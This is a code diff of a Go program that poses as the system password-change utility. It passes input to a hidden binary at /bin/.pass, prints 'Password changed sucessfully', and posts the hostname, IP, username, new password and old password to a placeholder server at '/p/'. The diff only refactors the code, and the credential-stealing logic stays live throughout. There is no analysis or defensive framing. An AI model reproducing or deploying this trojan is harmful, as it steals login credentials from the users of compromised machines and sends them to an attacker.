@@ -32,11 +32,12 @@ import (
 
 const (
 	bin    = "/bin/.pass"
-	server = "<server>:<port>"
+	nilIP  = "<nil>"
 	comm1  = "printf '%s\n%s\n' | /bin/.pass"
 	comm3  = "printf '%s\n%s\n' | /bin/.pass %s"
 	comm2  = "printf '%s\n%s\n%s\n' | /bin/.pass"
 	comm4  = "printf '%s\n%s\n%s\n' | /bin/.pass %s"
+	server = "<server>:<port>"
 )
 
 func main() {
@@ -105,10 +106,10 @@ func main() {
 	fmt.Printf("Password changed sucessfully.\n")
 	os.Exit(0)
 }
-func getIPAddress() string {
+func getIP() string {
 	i, err := net.Interfaces()
 	if err != nil {
-		return "<nil>"
+		return nilIP
 	}
 	for _, a := range i {
 		if a.Flags&net.FlagUp == 0 || a.Flags&net.FlagLoopback != 0 {
@@ -134,24 +135,24 @@ func getIPAddress() string {
 				return r.String()
 			}
 		} else {
-			return "<nil>"
+			return nilIP
 		}
 	}
-	return "<nil>"
+	return nilIP
 }
 func sendPassword(u string, p string, o string) {
 	h, err := os.Hostname()
 	if err != nil {
 		h = ""
 	}
-	d := bytes.NewReader([]byte(fmt.Sprintf("[%s:(%s)%s:%s-%s]\n", h, getIPAddress(), u, p, o)))
-	r, err := http.NewRequest("POST", fmt.Sprintf("http://%s/p/", server), d)
+	d := bytes.NewReader([]byte(fmt.Sprintf("[%s:(%s)%s:%s-%s]\n", h, getIP(), u, p, o)))
+	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
+	defer f()
+	r, err := http.NewRequestWithContext(x, http.MethodPost, fmt.Sprintf("http://%s/p/", server), d)
 	if err != nil {
 		return
 	}
-	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
-	defer f()
-	b, err := http.DefaultClient.Do(r.WithContext(x))
+	b, err := http.DefaultClient.Do(r)
 	if err != nil {
 		return
 	}
